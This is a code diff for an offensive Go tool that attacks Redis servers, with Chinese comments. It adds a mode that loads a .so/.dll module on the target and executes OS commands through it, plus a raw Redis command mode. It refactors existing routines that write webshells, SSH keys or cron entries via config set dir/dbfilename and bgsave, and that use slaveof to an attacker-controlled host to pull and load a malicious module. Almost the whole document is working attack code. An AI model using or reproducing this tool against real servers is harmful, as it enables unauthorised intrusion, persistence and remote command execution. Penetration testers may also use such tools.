@@ -12,6 +12,7 @@ import (
 	"io/ioutil"
 	"net"
 	"os"
+	"regexp"
 	"strconv"
 	"strings"
 	"sync"
@@ -29,12 +30,14 @@ var (
 	modules, rhost, rport, lhost, lport, pwd, fileName string
 	redisDir, redisDBFilename                          string
 	command, rpath, rfile, lfile, webshell, user       string
+	execTemplate, execName                             string
 	b64                                                bool
 )
 
 func init() {
 
 	help := `
+load	加载 dll 或 so 执行命令
 rce     主从复制命令执行
 upload  主从复制文件上传
 close   手动关闭主从复制
@@ -45,9 +48,10 @@ gopher  生成 ssrf  gopher
 brute   爆破 redis 密码
 bgsave  执行 bgsave 命令
 dir     探测文件是否存在
+cli     执行 Redis 命令
 	`
 
-	flag.StringVar(&modules, "m", "", "利用模式(rce,upload,shell,ssh,cron,cve,gopher,brute,close,bgsave,dir)"+help)
+	flag.StringVar(&modules, "m", "", "利用模式(load,rce,upload,shell,ssh,cron,cve,gopher,brute,close,bgsave,dir,cli)"+help)
 	flag.StringVar(&rhost, "r", "", "目标IP")
 	flag.StringVar(&rport, "p", "6379", "目标端口")
 	flag.StringVar(&lhost, "L", "", "本地IP | VPS IP")
@@ -65,6 +69,9 @@ dir     探测文件是否存在
 
 	flag.BoolVar(&b64, "b", false, "对 webshell, ssh公钥等内容进行Base64解码")
 
+	flag.StringVar(&execTemplate, "t", "system.exec", "dll 或 so 命令执行函数")
+	flag.StringVar(&execName, "n", "system", "dll 或 so 函数名字")
+
 }
 
 func main() {
@@ -74,7 +81,7 @@ func main() {
 ██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
 ██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝ 
 ██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
-╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝ @yuyan-sec
+╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝
 `
 	fmt.Println(logo)
 	flag.Parse()
@@ -186,16 +193,11 @@ func main() {
 			closeSlave(rfile)
 
 		case "bgsave":
-			bg := rdb.BgSave(ctx).Val()
-			if strings.EqualFold(bg, "Background saving started") {
-				fmt.Println("[OK]\tbgsave")
-			} else {
-				fmt.Println("[==]\tbg")
-			}
+			cliInfo("bgsave")
 
 		case "dir":
-			if rfile == "." {
-				fmt.Println("参数错误: RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf 目标文件名")
+			if rfile == "" {
+				fmt.Println("参数错误: RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf 目标文件名[绝对路径]")
 				return
 			}
 			res := configSet("dir", rfile)
@@ -207,7 +209,25 @@ func main() {
 			} else {
 				fmt.Println("执行成功 config set dir", rfile)
 			}
+		case "cli":
+			if command != "" {
+				cli(command)
+			} else {
+				loopCmd("cli")
+			}
+		case "load":
+			if rfile == "" {
+				fmt.Println("参数错误: RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf 目标 dll | so 文件名")
+				return
+			}
+			cliInfo("module load " + rfile)
 
+			if command != "" {
+				runCmd(command)
+				cliInfo("module unload " + execName)
+			} else {
+				loopCmd("load")
+			}
 		default:
 			redisVersion()
 		}
@@ -220,7 +240,7 @@ func connection(rhost, rport, password string) error {
 		Addr:     fmt.Sprintf("%s:%s", rhost, rport),
 		Password: password, // 密码
 		DB:       0,        // 数据库
-		PoolSize: 3,        // 连接池大小
+		//PoolSize: 3,        // 连接池大小
 	})
 
 	_, err := rdb.Ping(ctx).Result()
@@ -271,27 +291,110 @@ func configSet(str, data string) string {
 	return result
 }
 
+func cliInfo(commandLine string) {
+	//fmt.Printf("%s:%s> %s\n", rhost, rport, commandLine)
+
+	fmt.Println(">>>", commandLine)
+	cli(commandLine)
+}
+
+// cli
+func cli(commandLine string) {
+	result, err := redisCmd(commandLine)
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
+
+	// redis 4.x  5.x 获取的结果
+	if values, ok := result.([]interface{}); ok && len(values) > 1 {
+		if compression, ok := values[1].(string); ok {
+			fmt.Println(compression)
+		}
+	}
+
+	// redis 6.x 的结果
+	if val, ok := result.(map[interface{}]interface{}); ok {
+
+		for key, value := range val {
+			fmt.Printf("%v: %v\n", key, value)
+		}
+	}
+
+	// 处理 Redis 返回的简单字符串
+	if str, ok := result.(string); ok {
+		fmt.Println(str)
+	}
+
+	// 处理 Redis 返回的整型值
+	if num, ok := result.(int64); ok {
+		fmt.Println(num)
+	}
+
+	// 处理批量字符串
+	if bulkStr, ok := result.([]byte); ok {
+		fmt.Println(string(bulkStr))
+	}
+
+	// 处理数组
+	// if values, ok := result.([]interface{}); ok {
+	// 	for i, v := range values {
+	// 		fmt.Printf("Index %d: %v (%T)\n", i, v, v)
+	// 	}
+	// }
+
+	// 处理空值
+	if result == nil {
+		fmt.Println("Nil result (null value)")
+	}
+
+}
+
+// RedisCmd 执行 Redis 命令
+func redisCmd(cmd string) (interface{}, error) {
+
+	var argsInterface []interface{}
+
+	// 使用正则表达式处理引号内的内容
+	args, err := parseArgs(cmd)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, arg := range args {
+		argsInterface = append(argsInterface, arg)
+	}
+
+	info, err := rdb.Do(ctx, argsInterface...).Result()
+	if err != nil {
+		return nil, err
+	}
+	return info, nil
+}
+
+// parseArgs 解析命令行字符串，将引号内的部分作为单独的参数处理
+func parseArgs(cmd string) ([]interface{}, error) {
+	// 正则表达式匹配引号内的内容或非空白字符的内容
+	re := regexp.MustCompile(`"([^"]+)"|'([^']+)'|[^\s]+`)
+	matches := re.FindAllString(cmd, -1)
+
+	var args []interface{}
+	for _, match := range matches {
+		// 如果匹配项是以引号开始和结束的，就去掉引号
+		if strings.HasPrefix(match, "\"") && strings.HasSuffix(match, "\"") ||
+			strings.HasPrefix(match, "'") && strings.HasSuffix(match, "'") {
+			match = match[1 : len(match)-1]
+		}
+		args = append(args, match)
+	}
+	return args, nil
+}
+
+// 写 webshell  , ssh , cron
 func echoShell(dir, dbfilename, webshell string) {
 
-	defer func() {
-		// 恢复原始配置
-		fmt.Printf("[%s]\tconfig set dir %s\n", configSet("dir", redisDir), redisDir)
-		fmt.Printf("[%s]\tconfig set dbfilename %s\n", configSet("dbfilename", redisDBFilename), redisDBFilename)
-		fmt.Printf("[%s]\tconfig set rdbcompression %s\n", configSet("rdbcompression", configGet("rdbcompression")), configGet("rdbcompression"))
-		fmt.Printf("[%s]\tconfig set slave-read-only %s\n", configSet("slave-read-only", configGet("slave-read-only")), configGet("slave-read-only"))
-	}()
-
-	if dirOK := configSet("dir", dir); dirOK != "OK" {
-		fmt.Printf("[ERROR]\tFailed to set dir to %s\n", dir)
-		return
-	}
-	fmt.Printf("[OK]\tconfig set dir %s\n", dir)
-
-	if dbfilenameOK := configSet("dbfilename", dbfilename); dbfilenameOK != "OK" {
-		fmt.Printf("[ERROR]\tFailed to set dbfilename to %s\n", dbfilename)
-		return
-	}
-	fmt.Printf("[OK]\tconfig set dbfilename %s\n", dbfilename)
+	cliInfo("config set dir " + dir)
+	cliInfo("config set dbfilename " + dbfilename)
 
 	if b64 {
 		decodeBytes, err := base64.StdEncoding.DecodeString(webshell)
@@ -303,43 +406,50 @@ func echoShell(dir, dbfilename, webshell string) {
 	}
 
 	webshell = fmt.Sprintf("\n\n\n\n\n%v\n\n\n\n", webshell)
+
 	ok, err := rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()
 
 	readOnly := configGet("slave-read-only")
 
 	if err != nil {
 		if strings.Contains(err.Error(), "READONLY You can't write against a read only replica.") {
-			fmt.Println("[GG]\t目标开启了主从, 尝试关闭 slave-read-only 来写入文件")
+			//fmt.Println("[GG]\t目标开启了主从, 尝试关闭 slave-read-only 来写入文件")
 
 			if strings.EqualFold(readOnly, "yes") {
-				fmt.Printf("[%s]\tconfig set slave-read-only no\n", configSet("slave-read-only", "no"))
+				cliInfo("config set slave-read-only no")
+
 				ok, _ = rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()
 			}
 
 		} else {
-			fmt.Printf("[xx]\t%v\n", err)
+			fmt.Println(err)
 			return
 		}
 	}
 
-	fmt.Printf("[%v]\t%v\n", ok, "set webshell "+strings.ReplaceAll(webshell, "\n", ""))
+	fmt.Println(">>> set webshell", strings.ReplaceAll(webshell, "\n", ""))
+	fmt.Println(ok)
 
 	// 关闭redis压缩来写入文件
 	compression := configGet("rdbcompression")
 
-	if strings.EqualFold(compression, "yes") {
-		fmt.Printf("[%s]\tconfig set rdbcompression no\n", configSet("rdbcompression", "no"))
+	if compression == "yes" {
+		cliInfo("config set rdbcompression no")
 	}
 
-	bg := rdb.BgSave(ctx).Val()
-	if strings.EqualFold(bg, "Background saving started") {
-		fmt.Println("[OK]\tbgsave")
-	} else {
-		fmt.Println("[==]\tbg")
-	}
+	cliInfo("bgsave")
+	cliInfo("del webshell")
 
-	fmt.Printf("[%v ]\tdel webshell\n", rdb.Del(ctx, "webshell").Val())
+	defer func() {
+		// 恢复原始配置
 
+		cliInfo("config set dir " + redisDir)
+		cliInfo("config set dbfilename " + redisDBFilename)
+
+		cliInfo("config set rdbcompression " + compression)
+		cliInfo("config set slave-read-only " + readOnly)
+
+	}()
 }
 
 // RedisSlave 开启主从复制
@@ -351,49 +461,27 @@ func redisSlave(lhost, lport, dir, dbfilename string) {
 		payload = exp.DllPayload
 	}
 
-	bg := rdb.BgSave(ctx).Val()
-	if strings.EqualFold(bg, "Background saving started") {
-		fmt.Println("[OK]\tbgsave")
-	} else {
-		fmt.Println("[==]\tbg")
-	}
+	cliInfo("bgsave")
 
-	//slave := fmt.Sprintf("slaveof %v %v", lhost, lport)
+	cliInfo(fmt.Sprintf("slaveof %v %v", lhost, lport))
 
-	fmt.Printf("[%v]\tslaveof %v %v\n", rdb.SlaveOf(ctx, lhost, lport).Val(), lhost, lport)
-
-	if dirOK := configSet("dir", dir); dirOK != "OK" {
-		fmt.Printf("[ERROR]\tFailed to set dir to %s\n", dir)
-		return
-	}
-	fmt.Printf("[OK]\tconfig set dir %s\n", dir)
-
-	if dbfilenameOK := configSet("dbfilename", dbfilename); dbfilenameOK != "OK" {
-		fmt.Printf("[ERROR]\tFailed to set dbfilename to %s\n", dbfilename)
-		return
-	}
-	fmt.Printf("[OK]\tconfig set dbfilename %s\n", dbfilename)
+	cliInfo("config set dir " + dir)
+	cliInfo("config set dbfilename " + dbfilename)
 
 	err := listen(lport, payload)
 	if err != nil {
-		fmt.Printf("[xx]\t%v\n", err)
+		fmt.Println(err)
 		return
 	}
 
 	load := fmt.Sprintf("%v/%v", dir, dbfilename)
 
-	val, err := rdb.Do(ctx, "module", "load", load).Result()
-	if err != nil {
-		fmt.Printf("[xx]\t%v\n", err)
-		return
-	}
-
-	fmt.Printf("[%s]\tmodule load %s\n", val, load)
+	cliInfo("module load " + load)
 
 	defer func() {
 		// 恢复原始配置
-		fmt.Printf("[%s]\tconfig set dir %s\n", configSet("dir", redisDir), redisDir)
-		fmt.Printf("[%s]\tconfig set dbfilename %s\n", configSet("dbfilename", redisDBFilename), redisDBFilename)
+		cliInfo("config set dir " + redisDir)
+		cliInfo("config set dbfilename " + redisDBFilename)
 	}()
 }
 
@@ -468,12 +556,19 @@ func sendCmd(payload []byte, wg *sync.WaitGroup, c *net.TCPConn) {
 // RunCmd system.exec 执行命令
 func runCmd(cmd string) {
 
-	val, err := rdb.Do(ctx, "system.exec", cmd).Result()
+	// val, err := rdb.Do(ctx, "system.exec", cmd).Result()
+	// if err != nil {
+	// 	fmt.Println(err)
+	// 	return
+	// }
+
+	fmt.Printf(">>> %s %s\n", execTemplate, cmd)
+
+	val, err := redisCmd(execTemplate + " " + cmd)
 	if err != nil {
-		fmt.Printf("[xx]\t%v\n", err)
+		fmt.Println(err)
 		return
 	}
-
 	if len(val.(string)) > 0 {
 		fmt.Println("\n" + GbkToUtf8(val.(string)))
 	}
@@ -484,13 +579,7 @@ func runCmd(cmd string) {
 func closeSlave(dll string) {
 
 	// 执行 SLAVEOF NO ONE 命令
-	result, err := rdb.Do(ctx, "SLAVEOF", "NO", "ONE").Result()
-	if err != nil {
-		fmt.Printf("[xx]\t%v\n", err)
-		return
-	}
-
-	fmt.Printf("[%v]\tslaveof no one\n", result)
+	cliInfo("slaveof no one")
 
 	if strings.EqualFold(dll, "upload") {
 		return
@@ -498,18 +587,13 @@ func closeSlave(dll string) {
 
 	// 执行命令才卸载 module
 	if strings.Contains(dll, ".so") {
-		runCmd("rm " + dll)
-		fmt.Printf("[==]\trm %s\n", dll)
+		cliInfo("rm " + dll)
 	}
 
 	// 执行 MODULE UNLOAD <module_name> 命令
-	result, err = rdb.Do(ctx, "MODULE", "UNLOAD", "system").Result()
-	if err != nil {
-		fmt.Printf("[xx]\t%v\n", err)
-		return
-	}
 
-	fmt.Printf("[%v]\tmodule unload system\n", result)
+	cliInfo("module unload " + execName)
+
 }
 
 // RedisUpload 主从复制上传文件
@@ -523,7 +607,7 @@ func redisUpload(lhost, lport, rpath, rfile, lfile string) {
 	}
 
 	if fi.Size() < 9 {
-		fmt.Println(fmt.Sprintf("当前文件大小：%d 个字节，不能上传小于 9 个字节, 因为可能会把Redis打崩哦", fi.Size()))
+		fmt.Printf("当前文件大小：%d 个字节，不能上传小于 9 个字节, 因为可能会把Redis打崩哦\n", fi.Size())
 		os.Exit(0)
 	}
 
@@ -540,29 +624,19 @@ func redisUpload(lhost, lport, rpath, rfile, lfile string) {
 		os.Exit(0)
 	}
 
-	fmt.Printf("[%v]\tslaveof %v %v\n", rdb.SlaveOf(ctx, lhost, lport).Val(), lhost, lport)
-
-	if dirOK := configSet("dir", rpath); dirOK != "OK" {
-		fmt.Printf("[ERROR]\tFailed to set dir to %s\n", rpath)
-		return
-	}
-	fmt.Printf("[OK]\tconfig set dir %s\n", rpath)
-
-	if dbfilenameOK := configSet("dbfilename", rfile); dbfilenameOK != "OK" {
-		fmt.Printf("[ERROR]\tFailed to set dbfilename to %s\n", rfile)
-		return
-	}
-	fmt.Printf("[OK]\tconfig set dbfilename %s\n", rfile)
+	cliInfo(fmt.Sprintf("slaveof %v %v", lhost, lport))
+	cliInfo("config set dir " + rpath)
+	cliInfo("config set dbfilename " + rfile)
 
 	listen(lport, payload)
 
-	fmt.Printf("[OK]\t%v\\%v uploaded successfully\n", rpath, rfile)
+	fmt.Printf(">>> upload %v\n\n%v\\%v uploaded successfully\n\n", lfile, rpath, rfile)
 
 	defer func() {
 		// 恢复原始配置
 		closeSlave("upload")
-		fmt.Printf("[%s]\tconfig set dir %s\n", configSet("dir", redisDir), redisDir)
-		fmt.Printf("[%s]\tconfig set dbfilename %s\n", configSet("dbfilename", redisDBFilename), redisDBFilename)
+		cliInfo("config set dir " + redisDir)
+		cliInfo("config set dbfilename " + redisDBFilename)
 	}()
 }
 
@@ -663,18 +737,26 @@ func loopCmd(m string) {
 
 		if strings.EqualFold(cmd, "exit") || strings.EqualFold(cmd, "q") {
 
-			if strings.EqualFold(m, "rce") {
+			if m == "rce" {
 				closeSlave(rfile)
+			}
+
+			if m == "load" {
+				cliInfo("module unload " + execName)
 			}
 
 			break
 		}
-		if strings.EqualFold(m, "cve") {
-			redisLua(cmd)
-		}
 
-		if strings.EqualFold(m, "rce") {
+		switch m {
+		case "cve":
+			redisLua(cmd)
+		case "cli":
+			cli(cmd)
+		case "rce":
+		case "load":
 			runCmd(cmd)
+
 		}
 
 	}
